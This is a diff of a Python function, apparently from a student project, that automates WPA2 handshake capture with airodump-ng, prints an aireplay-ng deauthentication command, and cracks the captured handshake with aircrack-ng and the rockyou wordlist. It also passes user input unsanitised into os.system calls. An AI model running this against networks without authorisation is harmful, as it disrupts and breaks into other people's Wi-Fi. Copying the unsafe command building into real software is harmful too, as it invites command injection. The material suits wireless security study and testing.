@@ -11,15 +11,14 @@ def wpa_capture_password_cracking():
     print("1. Crack password using already existing capture file")
     print("2. Capture WPA handshake and then crack network password")
     print("---------------------------------------------------------------------")
-    
+
     option = int(input())
-    print(option)
 
     match option:
         case 1:
             os.chdir("..")
             capture_file = input("Enter the name of the .cap capture file: ")
-            os.system("aircrack-ng -a2 -w wordlists/rockyou.txt " + capture_file)
+            os.system("aircrack-ng -a2 -w /home/khushboo/Documents/GitHub/FYP/wordlists/rockyou.txt " + capture_file)
 
         case 2:
             try:
@@ -31,18 +30,16 @@ def wpa_capture_password_cracking():
                 os.system("mkdir SniffedNetworkData/" + package_name)
 
                 capFile_name = input("Enter the name to be assigned to the wireshark capture file: ")
-                os.system("airodump-ng -c " + channel + " --bssid " + passed_bssid + " -w SniffedNetworkData/" + package_name + "/" + capFile_name + " wlan0mon")
-                # command1 = ["airodump-ng", "-c", channel, "--bssid", passed_bssid, "-w", "SniffedNetworkData/" + package_name + "/" + capFile_name, "wlan0mon"]
-                command2 = ["aireplay-ng", "-0", "10", "-a", passed_bssid, "wlan0mon"]
 
-                # subprocess.Popen(command1)
-                subprocess.Popen(command2, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                command1 = f"airodump-ng -w SniffedNetworkData/{package_name}/{capFile_name} -c {channel} --bssid {passed_bssid} wlan0mon"
+                print("---------------------------------------------------------------------")
+                print("Use this command in a different terminal in privelege mode:\naireplay-ng -0 10 -a " + passed_bssid +" wlan0mon")
+                print("---------------------------------------------------------------------")
+                os.system(command1)
 
-                print("Paste the path for generated capture file ")
-                capFile_path = input()
+                sniffed_capture_file = input("Paste the generated .cap file:\t")
 
-                os.system("wireshark " + capFile_path)
-                os.system(" aircrack-ng -a2 -w wordlists/rockyou.txt " + capFile_name)
+                os.system("aircrack-ng -a2 -w /home/khushboo/Documents/GitHub/FYP/wordlists/rockyou.txt " + sniffed_capture_file)
             except Exception as e:
                 print(f"Error performing WPA2 handshake: {e}")
         case _:
